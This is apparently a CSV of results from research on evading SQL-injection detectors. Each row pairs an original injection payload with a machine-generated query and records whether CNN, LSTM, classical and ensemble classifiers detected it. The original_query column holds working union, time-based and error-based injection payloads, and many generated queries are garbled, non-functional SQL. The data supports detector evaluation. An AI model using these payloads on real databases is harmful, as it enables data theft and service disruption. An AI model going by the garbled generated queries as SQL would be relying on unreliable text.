original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
"1' in boolean mode  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","SELECT * FROM SQL_injection WHERE NOT rdb$types = 'evade sq injection' ORDER BY rdb$collations as t3,rdb$functions as t4",1,1,0,1,0,0,0
-7772'   )    )    or 9323  =  9323#,SELECT MIN(9323 = 9323#) FROM SQL injection,1,1,0,0,1,0,0
"1""   )    )    as nhus where 3689  =  3689",SELECT MIN(3689 = 3689) FROM SQL injection detection,1,0,1,1,1,1,1
"1%'   )    )     )   union all select null,null,null,null#","SELECT NOT null,null,null FROM SQL SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM SQL",1,1,1,1,1,1,1
"-2364'+  (  select 'qdut' where 7560  =  7560 union all select 7560,7560,7560,7560,7560--",SELECT MIN(sqdut) FROM SQL injection,1,0,1,1,1,1,1
"1   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --","SELECT * FROM chr WHERE NOT SQL_injection = ""valid"" ORDER BY chr ( 87 )",1,0,1,0,0,0,0
"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""alvd"" like ""alvd",SELECT MIN((((((((((((((()) FROM SQL injection) FROM SQL injection) AND NOT SELECT DISTINCT (((((((((((((((((((((((((((((()) FROM SQL injection),0,1,0,0,0,0,0
"-5026' where 7324  =  7324 union all select 7324,7324--",SELECT MIN(SQL injection) FROM SQL_Injection,1,0,1,1,1,1,1
"-9150%'   )    )     )   union all select 7057,7057,7057,7057,7057,7057,7057,7057--",SELECT MIN(sql) FROM SQL injection,1,0,1,1,1,1,1
"-5539""  )   union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--","SELECT MIN(6189,6189,6189,6189,6189,6189,6189-- for SQL injection.sql injection_method FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SQL_Injection",1,1,1,1,0,1,0
"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'bdsq' like 'bdsq",SELECT MIN(sq) FROM SQL injection,1,0,1,1,1,1,1
"1""   )    )    as dksq where 7161  =  7161",SELECT MIN(sql) FROM SQL injection,1,0,1,1,1,1,1
"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#","SELECT MIN(sql injection) FROM 7845,7845,7845,7845,7845,7845# FROM SQL_Injection WHERE NOT SELECT MIN(sql injection) FROM SELECT 7845,7845,7845,7845,7845,7845# FROM Query: -3370",1,1,1,0,0,0,0
"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --","SELECT 6793 FROM pg_sleep WHERE ""sql injection"" = ""evade"" ORDER BY 6793 = ""sql injection detection""",1,0,0,0,0,0,0
"1' in boolean mode  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",SELECT MIN(excat) FROM SQL_Injection WHERE NOT md5 ( 0x4b774c75 ) = 'evade sq injection',1,1,0,0,1,0,0
"1'  )   and elt  (  3528  =  3566,3566  )  ","SELECT MIN(3528 = 3566,3566) FROM SQL injection",1,1,1,1,1,1,1
"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lazm"" like ""lazm","SELECT MIN(*) FROM SQL_injection, COUNT(*) FROM SQL_injection)",1,0,1,0,1,1,0
"1%""  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""%""  =  ""","SELECT * FROM SQL_Injection, COUNT(*) FROM SQL_Injection WHERE NOT elt = 'evade SQL injection detection'",1,0,1,1,1,1,1
1'||  (  select 'sliy' where 9494  =  9494,SELECT SELECT'sliy' FROM SQL injection',1,0,1,1,1,1,1
"-2377%'   )    )     )   union all select 7706,7706--","SELECT DISTINCT esq injection FROM SELECT 7706,7706-- FROM SQL_Injection",1,0,1,1,1,1,1
"1%"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""%""  =  """,SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"1""   )    )    or sleep  (  5  )  #",SELECT MIN(5 - 1) FROM SQL injection detection,1,1,1,1,1,1,1
1'+  (  select 'iyyv' where 9500  =  9500 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   +',SELECT MIN(sql injection) FROM SQL - SELECT DISTINCT iyyv FROM 'exces',1,0,1,1,1,1,1
"-3541"" or make_set  (  9354  =  9354,7185  )   and ""fgxu""  =  ""fgxu","SELECT MIN(9354 = 9354,7185 ) FROM SELECT MIN(fgxu) FROM SQL injection AS t1 JOIN SELECT t2.sql injection_detecting FROM SELECT t2.sql injection_detecting FROM SELECT t2.sql injection_detecting FROM SELECT t2.sql injection_detecting FROM SELECT t2.sql injection_detecting FROM SELECT t2.sql, 7185 ) FROM SELECT SELECT MIN(9354 = 9354 = 9354 = 7185",0,1,0,0,1,0,0
"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --","SELECT NOT (crypt_key, COUNT(crypt_key) FROM query, database WHERE NOT SQL_injection = ""valid"" AND query = 1 AND query: 107 -|char ( 109 - crypt_key) = 'valid')",1,1,0,0,1,0,0
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*","SELECT 3000000,MD5(1) FROM SQL AS t1 JOIN query: +if(benchmark(3000000,MD5(1)) FROM query: +if(benchmark(3000000,MD5(1)) FROM query: +if(benchmark(3000000,MD5(1)) FROM SQL AS t1 JOIN (SELECT NULL, NULL) FROM query: +if(benchmark(3000000,MD5(1)) FROM query: +if(benchmark(3000000,MD5(1)) FROM SELECT * FROM SELECT NOT AS t2 ON t1.customer = ""sq injection"" AND NOT t1.benchmark(3000000,MD5(1) = ""valid""",0,1,0,0,1,0,0
"1%""  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",SELECT MIN(excat) FROM SQL_injection,1,0,1,1,1,1,1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",SELECT DISTINCT 'evade SQL injection detection' FROM SQL_injection,1,0,1,1,1,1,1
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""eakt"" like ""eakt","SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT SUM((SELECT SUM((SELECT SUM((SELECT * FROM srmq, SUM(SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM SELECT * FROM",0,1,1,1,1,1,1
-2992'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'tjgt'  =  'tjgt,SELECT MIN(sql injection) FROM SQL -2992' ORDER BY MIN(sql injection),0,1,1,1,0,1,0
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'yctp'  =  'yctp,SELECT DISTINCT ( ( (SELECT SUM((SELECT SUM() FROM SQL injection)) FROM SQL SELECT DISTINCT ((SELECT SUM((SELECT SUM((SELECT SUM(short) FROM SQL)) FROM SQL SELECT SUM(short_title) FROM (SELECT SUM(short_title) FROM (SELECT SUM(short_title) FROM SQL injection)) FROM (SELECT SUM(short_title) FROM (SELECT SUM((((SELECT SUM(((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM(short_title) FROM SQL))),1,1,0,0,1,0,0
1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,"SELECT MIN(1 * 365) FROM SQL_injection WHERE NOT jxtg = ""1071 = 1071"" AND sleep ( 5 ) = ""evade""",1,1,0,0,0,0,0
1  )   where 2543  =  2543,SELECT * FROM query: 1 JOIN SQL injection query: 2543 = 2543,0,0,1,1,1,1,1
1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,SELECT MIN(SQL) FROM SQL_injection,1,0,1,1,1,1,1
"admin"" or ""1""  =  ""1""#","SELECT MIN(""sql injection detection"") FROM SQL SELECT MIN(1) FROM SQL",1,0,0,0,1,0,0
-2411 or   (  8459  =  8459  )  *4906# pxwg,"SELECT 8459 = 8459 AND NOT SQL_inject = ""valid""",1,1,1,0,0,0,0
-7565%'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  ',SELECT DISTINCT esq_injection FROM SQL_injection,1,0,1,1,1,1,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""pdqm"" like ""pdqm","SELECT DISTINCT pdqm FROM ""SQL injection detection""",1,0,1,1,1,1,1
" select * from users where id  =  1 or "".]"" or 1  =  1 -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR "".]"" OR 1 = 1",0,1,1,0,0,0,0
"1%'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  '%'  =  '","SELECT MIN(5000000,md5 ( 0x76555642 ) FROM SQL injection'",1,1,0,0,1,0,0
"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr","SELECT MIN(sequence) FROM SQL injection - SELECT MIN(sequence) FROM SQL SELECT rkvr FROM rlike WHERE NOT rkvr = ""rkvr"" AND NOT rkvr = ""rkvr""",1,1,1,0,1,1,0
1'+  (  select 'phtz' where 3171  =  3171,SELECT 'evade sq injection detection' FROM SQL SELECT MIN(3171 = 3171 = 3171,1,1,0,1,1,1,0
1'  )   where 5540  =  5540 waitfor delay '0:0:5'--,SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
'/**/or/**/1/**/=/**/1,SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT SELECT DISTINCT * FROM SQL,1,0,1,1,1,1,1
"1"" where 4082  =  4082 and elt  (  5699  =  1432,1432  )  --","SELECT MIN(1432 - 1) FROM SQL_injection WHERE 4082 = 4082 AND NOT elt ( 5699 = 1432,1432 )",1,1,0,0,0,0,0
"1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #","SELECT MIN(5000000,md5 ( 0x6d457153 ) FROM SQL injection AS T1 JOIN detection AS T2 ON T1.md5 = T2.5000000,md5 ( 0x6d457153 )",1,1,0,1,0,0,0
"1'  )   as ohnu where 4097  =  4097 union all select null,null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - evade_sq_injection) FROM SQL,1,1,1,1,1,1,1
INSERT INTO table,"SELECT * FROM table WHERE NOT SELECT SELECT * FROM table_name = ""sql injection"" AND NOT SELECT * FROM table_name",1,0,1,1,1,1,1
"1%"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""%""  =  ""","SELECT * FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 INTERSECT SELECT * FROM SQL_Injection WHERE NOT sysusers = ""sys1,sysusers as sys1,sysusers as sys4,sysusers as sys7 ) AND ""%"" = ""SQL injection""",1,1,0,0,0,0,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'fvda' like 'fvda","SELECT dbms_pipe.receive_message, MIN(sql) FROM dbms_pipe.receive_message WHERE NOT chr ( 101 ) = 'fvda' AND NOT chr ( 67 ) = 'valid'",1,1,0,0,1,0,0
1'||  (  select 'yzdz' where 5021  =  5021,SELECT 'evade sq injection detection' FROM SQL SELECT SELECT 'evade sq injection detection' FROM query: 1'|| (SELECT 'yzdz' FROM SQL injection detection'),1,1,1,0,1,1,0
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--",SELECT MIN(11--) FROM SQL_injection,1,0,1,1,1,1,1
"1   )    )    union all select null,null,null,null,null,null,null,null--","SELECT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null, null, null, null, null, null, null, null, null, null-- sw - evade SQL injection detection FROM SQL,'sq injection'",1,1,1,0,0,0,0
"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ","SELECT MIN(s) FROM SQL injection, COUNT(*) FROM SQL_Injection WHERE NOT elt (3484 = 3484,1 - 1",1,1,0,0,1,0,0
if  (  9690  =  6491  )   select 9690 else drop function nyln--,SELECT 9690 FROM SQL injection_detect_code WHERE NOT 9690 = 6491,1,0,1,1,1,1,1
"1"" where 7380  =  7380 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","SELECT MIN(*) FROM SQL injection, SELECT MIN(*) FROM SQL_injection WHERE 7380 = 7380 OR 7380 = 7380 OR domain.domain.tables = 9643 = (SELECT MIN(*) FROM SQL)",1,1,0,0,0,0,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i",SELECT DISTINCT SELECT FROM sys.all_tables WHERE NOT sys.all_tables LIMIT = 1 ORDER BY SELECT LIMIT 1,0,0,1,1,0,1,0
"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'tvar'  =  'tvar","SELECT DISTINCT t1.tvar FROM evade SQL injection detection, COUNT(*) FROM SQL_injection)",1,0,1,1,1,1,1
"1'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","SELECT * FROM SQL_injection, COUNT(*) FROM sysibm.systables as t2,sysibm.systables as t3 JOIN evade SQL injection detection'",1,1,0,0,1,0,0
1  )   where 4600  =  4600 or sleep  (  5  )  --,"SELECT * FROM query: 1 WHERE 4600 = 4600 OR sleep ( 5 ) = ""valid""",1,1,0,0,0,0,0
"1 where 6881  =  6881 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --","SELECT MIN(extractionvalue) FROM SQL, SELECT MIN(extractionvalue) FROM SQL injection",1,0,1,1,1,1,1
"1' and elt  (  1533  =  5695,5695  )   and 'ycgi'  =  'ycgi","SELECT MIN(1533 = 5695,5695 ) FROM elt WHERE NOT SELECT SELECT MIN(sql injection) FROM SQL injection",1,1,1,1,1,1,1
"1""   )    )     )   and 4595  =  4595#",SELECT MIN(4595 = 4595#) FROM SQL injection,1,0,0,0,1,0,0
1' and non_existant_table = '1,SELECT MIN(exast_injection) FROM SQL_injection WHERE NOT Query: 1' AND NOT Query: 1',1,0,1,0,1,1,0
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'","SELECT MIN(sql injection) FROM * FROM SQL_injection WHERE id = ""1"" union select #,@@VERSION -- 1""",1,1,1,0,0,0,0
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",SELECT MIN(SQL) FROM SQL_Injection WHERE NOT SELECT SELECT SELECT MIN(SQL) FROM SQL,1,0,1,1,1,1,1
"1"" where 3678  =  3678 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",SELECT MIN(sql injection) FROM SQL_Injection WHERE 3678 = 3678 AND 6537 = dbms_pipe.receive_message (SELECT MIN(sql injection) FROM SQL_Injection),1,1,1,0,1,1,0
1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,"SELECT 6793 FROM pg_sleep WHERE NOT i_sq_injection = ""evade"" ORDER BY 6793",0,0,1,1,0,1,0
"-3913"" where 6085  =  6085 union all select 6085,6085,6085,6085,6085,6085,6085#","SELECT MIN(6085 = 6085,6085,6085,6085,6085,6085,6085# FROM SQL injection_methods WHERE NOT SELECT MIN(6085 = 6085 = 6085",1,1,1,0,0,0,0
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--","SELECT (SELECT MAX(3000000,MD5(1)) FROM SQL AS t1 JOIN SELECT * FROM SQL AS t2 ON t1.user = t2.username WHERE NOT t2.sql = 'valid')",1,1,0,0,0,0,0
"-4194""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""ddbc"" like ""ddbc",SELECT DISTINCT (((((((((((((((()) FROM SQL injection) ORDER BY ddbc,1,1,0,0,0,0,0
' waitfor delay '0:0:20' /*,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'ykjs' like 'ykjs,SELECT MIN(SQL) FROM SQL Injection) AND 3754 = 3754,1,1,0,0,0,0,0
1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'hgtg'  =  'hgtg,SELECT MIN(4386 = 4386) FROM SQL_inaddr.get_host_address WHERE NOT chr = 4386 AND NOT chr ( 113 ) = 113,1,1,0,0,0,0,0
select   (  case when   (  1412  =  5313  )   then 1412 else 1412*  (  select 1412 from mysql.db  )   end  )  #,SELECT * FROM (SELECT SUM(invalid SQL) FROM query) AS _valid_sql.db ) FROM query,1,0,1,1,1,1,1
' or '1'='1,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(500000000/2 ) FROM SQL_Injection WHERE 5956 = 5956 AND 148 = like (SELECT MIN(500000000000/2 ) FROM SQL),1,1,0,0,1,0,0
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jrpk'  =  'jrpk,"SELECT DISTINCT ( ( (SELECT SUM((SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT) FROM (SELECT, SUM(((((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM((SELECT S",0,1,1,0,1,1,0
"-8875""  )   where 8428  =  8428 or 1519  =  5756--",SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
"1""   )    )    as ljhz where 2416  =  2416",SELECT MIN(2416 = 2416) FROM SQL injection,1,1,0,0,1,0,0
"',NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT MIN(%20delay%20'0:0:20'%20-- for: 'evade SQL injection detection',1,1,0,0,0,0,0
"-2889   )    )    as iqzv where 1786  =  1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--","SELECT MIN(1786,1786,1786,1786,1786,1786-- for SQL injection.SQzV FROM Query: -2889 ) as iqzv WHERE ""1786 = 1786 = 1786,1786,1786,1786,1786,1786,1786-- for"" AND NOT iqzv.sqzv. = ""1786 = 1786""",0,1,1,0,0,0,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3--","SELECT * FROM SQL injection, COUNT(*) FROM SQL_injection WHERE NOT domain.domain.columns = ""t1, domain.tables"" AND NOT domain.domain.tables = ""t3--""",1,1,1,0,0,0,0
"UNION SELECT @@VERSION,SLEEP(5),3",SELECT MIN(sql) FROM SELECT SELECT SELECT SELECT MIN(sql) FROM SQL,1,0,1,1,1,1,1
